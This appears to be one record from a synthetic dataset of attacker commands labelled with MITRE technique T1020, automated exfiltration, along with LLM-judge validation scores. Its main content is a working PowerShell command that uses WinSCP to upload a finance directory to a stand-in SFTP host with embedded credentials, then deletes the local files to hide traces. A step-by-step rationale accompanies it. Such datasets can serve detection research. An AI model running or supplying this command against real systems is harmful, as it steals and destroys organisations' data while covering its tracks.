{
  "technique_id": "T1020",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "$r=\"/drop/finance/\"; & 'C:\\Program Files (x86)\\WinSCP\\WinSCP.com' /ini=nul /command 'option batch abort' 'option confirm off' 'open sftp://exfil:S3cr3t!@192.0.2.10/ -hostkey=\"ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\"' 'option transfer binary' (\"put -delete -resume -nopermissions -preservetime C:\\Finance\\Q4\\* `\"$r`\" -filemask=|*.tmp;|*.bak\") 'exit' | Out-Null 2>$null",
  "explanation": "Automates exfiltration of a directory tree to an SFTP server, skipping temp/backup files and removing local copies after successful transfer.",
  "rationale_steps": [
    "Select target directory and exclude noisy file types",
    "Establish SFTP connection in batch mode",
    "Recursively upload files with resume support",
    "Delete local files upon successful transfer to reduce trace"
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1020-1f3f2541-38e52d4c",
  "source_prompt_hash": "1f3f2541",
  "timestamp_utc": "2025-09-30T09:07:17.472275Z",
  "validation": {
    "syntax_ok": true,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "PowerShell command is well-formed with balanced quoting/parentheses, valid WinSCP options, proper escaping for the $r variable, and correct piping/redirection.",
        "semantic_score": 4,
        "semantic_justification": "It automates SFTP exfiltration with WinSCP (batch mode, confirm off, resume, delete, hostkey pinning) as claimed, though the -filemask uses an extra '|' which likely fails to exclude *.bak files as intended.",
        "combined_score": 4.5,
        "confidence": 0.86,
        "timestamp": "2025-10-01T02:35:17.432391Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with proper quoting, variable assignment, command chaining, parameter passing to WinSCP.com, and error redirection.",
        "semantic_score": 5,
        "semantic_justification": "The command fully implements automated exfiltration by using WinSCP to transfer financial data to an SFTP server with proper authentication, file filtering, and local file deletion after transfer, aligning perfectly with the T1020 technique.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-01T02:35:20.241291Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The Powershell command is perfectly well-formed, with correct variable assignment, call operator usage, WinSCP command-line switches, and properly quoted script commands, including the correct handling of variable expansion within the `put` command string.",
        "semantic_score": 5,
        "semantic_justification": "The command perfectly achieves the claimed intent of automated exfiltration using WinSCP for SFTP, targeting specific sensitive data, excluding irrelevant files, removing local copies, and running non-interactively and stealthily, fully aligning with T1020.",
        "combined_score": 5.0,
        "confidence": 1,
        "timestamp": "2025-10-01T02:35:37.803447Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 4.667,
    "llm_average_score": 4.833,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null,
    "Syntax_Run_Details": ""
  }
}
